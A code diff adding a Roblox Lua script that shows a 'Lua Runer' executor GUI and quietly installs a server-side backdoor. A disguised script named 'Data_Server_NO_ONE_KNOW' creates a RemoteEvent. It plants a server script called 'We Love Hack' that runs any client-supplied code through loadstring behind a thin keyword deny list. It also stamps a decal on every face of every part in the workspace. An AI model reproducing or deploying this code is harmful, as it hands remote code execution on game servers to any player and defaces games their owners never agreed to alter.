@@ -1,0 +1,298 @@
+--make by Neko Studio / Sou Studio
+
+local API_SERVER_2V = Instance.new("ScreenGui")
+local Title = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local UIGradient = Instance.new("UIGradient")
+local Rname = Instance.new("TextLabel")
+local TestFram = Instance.new("Frame")
+local Run = Instance.new("TextButton")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local TextBox = Instance.new("TextBox")
+local UICorner_2 = Instance.new("UICorner")
+
+--Properties:
+
+API_SERVER_2V.Name = "API_SERVER_2V"
+API_SERVER_2V.Parent = (game:GetService("CoreGui") or gethui())
+API_SERVER_2V.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+API_SERVER_2V.ResetOnSpawn = false
+
+Title.Name = "Title"
+Title.Parent = API_SERVER_2V
+Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Title.BorderSizePixel = 0
+Title.Position = UDim2.new(0.0415617116, 0, 0.0961098373, 0)
+Title.Size = UDim2.new(0.434130996, 0, 0.0588100255, 0)
+
+UICorner.CornerRadius = UDim.new(0.5, 0)
+UICorner.Parent = Title
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(148, 148, 148)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(103, 103, 103))}
+UIGradient.Parent = Title
+
+Rname.Name = "Rname"
+Rname.Parent = Title
+Rname.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Rname.BackgroundTransparency = 1.000
+Rname.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Rname.BorderSizePixel = 0
+Rname.Position = UDim2.new(0, 0, 0.688715458, 0)
+Rname.Size = UDim2.new(1, 0, -0.588715076, 0)
+Rname.Font = Enum.Font.Unknown
+Rname.Text = "Lua Runer"
+Rname.TextColor3 = Color3.fromRGB(0, 0, 0)
+Rname.TextScaled = true
+Rname.TextSize = 14.000
+Rname.TextWrapped = true
+
+TestFram.Name = "TestFram"
+TestFram.Parent = Title
+TestFram.BackgroundColor3 = Color3.fromRGB(149, 149, 149)
+TestFram.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TestFram.BorderSizePixel = 0
+TestFram.Position = UDim2.new(0, 0, 10.6225748, 0)
+TestFram.Size = UDim2.new(1, 0, -9.9389143, 0)
+
+Run.Name = "Run"
+Run.Parent = TestFram
+Run.BackgroundColor3 = Color3.fromRGB(77, 77, 77)
+Run.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Run.BorderSizePixel = 0
+Run.Position = UDim2.new(0.191470817, 0, 0.90044266, 0)
+Run.Size = UDim2.new(0.615709305, 0, -0.100000001, 0)
+Run.Font = Enum.Font.Unknown
+Run.Text = "Run"
+Run.TextColor3 = Color3.fromRGB(255, 255, 255)
+Run.TextScaled = true
+Run.TextSize = 14.000
+Run.TextWrapped = true
+
+ScrollingFrame.Parent = TestFram
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.BackgroundTransparency = 1.000
+ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScrollingFrame.BorderSizePixel = 0
+ScrollingFrame.Position = UDim2.new(0.020307513, 0, 0.0425567739, 0)
+ScrollingFrame.Size = UDim2.new(0.958000004, 0, 0.660000026, 0)
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+TextBox.Parent = ScrollingFrame
+TextBox.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(-0.000890281459, 0, -0.0165906418, 0)
+TextBox.Size = UDim2.new(1, 0, 1, 0)
+TextBox.ClearTextOnFocus = false
+TextBox.Font = Enum.Font.SourceSansBold
+TextBox.MultiLine = true
+TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.PlaceholderText = "print(\"Hello World\")"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextSize = 15.000
+TextBox.TextWrapped = true
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+
+UICorner_2.CornerRadius = UDim.new(0.0500000007, 0)
+UICorner_2.Parent = TextBox
+
+-- Scripts:
+
+local function CCAN_fake_script() -- Run.LocalScript 
+	local script = Instance.new('LocalScript', Run)
+
+	--// Client
+	
+	script.Parent.MouseButton1Down:Connect(function()
+		local command = script.Parent.Parent.ScrollingFrame.TextBox.Text
+		local no = game:GetService("ReplicatedStorage")["a"]
+		local playerName = game.Players.LocalPlayer.Name
+		local mode = true
+		 no:FireServer(command, playerName , mode)
+		 print("you run :"..command)
+		end)
+	
+end
+coroutine.wrap(CCAN_fake_script)()
+local function LKMMBPL_fake_script() -- ScrollingFrame.LocalScript 
+	local script = Instance.new('LocalScript', ScrollingFrame)
+
+	local textArea = script.Parent.TextBox
+	local scrollFrame = script.Parent
+	
+	textArea:GetPropertyChangedSignal("TextFits"):Connect(function()
+		while textArea.TextFits == false do
+			scrollFrame.CanvasSize = UDim2.new(0, 0, 0, scrollFrame.CanvasSize.Y.Offset + 16)
+			scrollFrame.CanvasPosition = Vector2.new(0, scrollFrame.CanvasSize.Y.Offset - scrollFrame.AbsoluteWindowSize.Y)
+		end
+	end)
+	
+	textArea:GetPropertyChangedSignal("TextBounds"):Connect(function()
+		if scrollFrame.CanvasSize.Y.Offset > textArea.TextBounds.Y + 16 then
+			scrollFrame.CanvasSize = UDim2.new(0, 0, 0, textArea.TextBounds.Y)
+			scrollFrame.CanvasPosition = Vector2.new(0, scrollFrame.CanvasSize.Y.Offset - scrollFrame.AbsoluteWindowSize.Y)
+		end
+	end)
+end
+coroutine.wrap(LKMMBPL_fake_script)()
+local function BUNLL_fake_script() -- Title.Dragify 
+	local script = Instance.new('LocalScript', Title)
+
+	local UserInputService = game:GetService("UserInputService")
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	local function update(input)
+		local delta = input.Position - dragStart
+		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+	
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end
+coroutine.wrap(BUNLL_fake_script)()
+local function QFPYC_fake_script() -- API_SERVER_2V.Data_Server_NO_ONE_KNOW 
+	local script = Instance.new('Script', API_SERVER_2V)
+
+	-- Create and store the RemoteEvent in ReplicatedStorage
+	local remoteEvent = Instance.new("RemoteEvent")
+	remoteEvent.Parent = game:GetService("ReplicatedStorage")
+	remoteEvent.Name = "a"
+	
+	local workspace = game:GetService("Workspace")
+	
+	-- Function to create new decals on all faces of every BasePart in the workspace
+	local function createDecalsOnAllParts()
+		-- Loop through all descendants in the workspace
+		for _, object in pairs(workspace:GetDescendants()) do
+			-- Ensure the object is a BasePart (e.g., Part, WedgePart, etc.)
+			if object:IsA("BasePart") then
+				local parentPart = object
+	
+				-- Define decal faces
+				local faces = {
+					Enum.NormalId.Front,
+					Enum.NormalId.Back,
+					Enum.NormalId.Left,
+					Enum.NormalId.Right,
+					Enum.NormalId.Top,
+					Enum.NormalId.Bottom
+				}
+	
+				-- Add new decals to all faces
+				for _, face in ipairs(faces) do
+					local newDecal = Instance.new("Decal")
+					newDecal.Texture = "rbxassetid://15340738025" -- Assign the texture to the new decal
+					newDecal.Face = face -- Apply to each face
+					newDecal.Parent = parentPart -- Assign the parent as the part
+				end
+			end
+		end
+	end
+	
+	-- Call the function to create decals on all parts
+	createDecalsOnAllParts()
+	
+	-- Server script setup for RemoteEvent
+	local function RMS()
+		local Real = Instance.new("Script", game:GetService("ServerScriptService"))
+		Real.Name = "We Love Hack"
+	
+		local replicatedStorage = game:GetService("ReplicatedStorage")
+		local remoteEvent = replicatedStorage:WaitForChild("a")
+	
+		-- Main event handler for the remote event
+		remoteEvent.OnServerEvent:Connect(function(player, code, name, mode)
+			-- Define disallowed patterns
+			local disallowedPatterns = {
+				"Kick", "ServerScriptService", "ReplicatedStorage", 
+				"API_SERVER_2V", "require", "loadstring", 
+				"Data_Server_NO_ONE_KNOW", "SoftShutdownScript", "ServerStorage",
+				"game.Players.LocalPlayer", "game.CoreGui", "error", "getfenv",
+				"setfenv", "setmetatable", "getmetatable", "debug"
+			}
+	
+			-- Check for disallowed patterns in the incoming code
+			for _, disallowedPattern in ipairs(disallowedPatterns) do
+				if string.find(code, disallowedPattern) then
+					player:Kick("You can't use " .. disallowedPattern)
+					return
+				end
+			end
+	
+			-- Additional security - restrict commands modifying game-critical objects
+			local additionalRestrictedPatterns = {
+				"game%.Workspace", "game%.Lighting", "game%.StarterGui", "game%.StarterPack"
+			}
+	
+			-- Block attempts to access restricted areas
+			for _, restrictedPattern in ipairs(additionalRestrictedPatterns) do
+				if string.find(code, restrictedPattern) then
+					player:Kick("Modification of " .. restrictedPattern .. " is not allowed.")
+					return
+				end
+			end
+	
+			-- Sanitize code before execution (replace specific references with server-safe ones)
+			code = string.gsub(code, "game%.Players%.LocalPlayer", "game.Players[" .. string.format("%q", player.Name) .. "]")
+			code = string.gsub(code, "game%.CoreGui", "game.Players[" .. string.format("%q", player.Name) .. "].PlayerGui")
+	
+			-- Securely load and execute the code
+			local func, err = loadstring(code)
+			if func then
+				local success, execErr = pcall(func)
+				if not success then
+					warn("Error executing code: " .. tostring(execErr))
+				end
+			else
+				warn("Error loading code: " .. tostring(err))
+			end
+		end)
+	end
+	
+	coroutine.wrap(RMS)()
+end
+coroutine.wrap(QFPYC_fake_script)()
+local function SIFLVN_fake_script() -- API_SERVER_2V.LocalScript 
+	local script = Instance.new('LocalScript', API_SERVER_2V)
+
+	local Data_Server = script.Parent.Data_Server_NO_ONE_KNOW
+	local server = game:GetService("ServerScriptService")
+	
+	local api = Data_Server:Clone()
+	api.Name = "Server Test"
+	api.Parent = server
+end
+coroutine.wrap(SIFLVN_fake_script)()
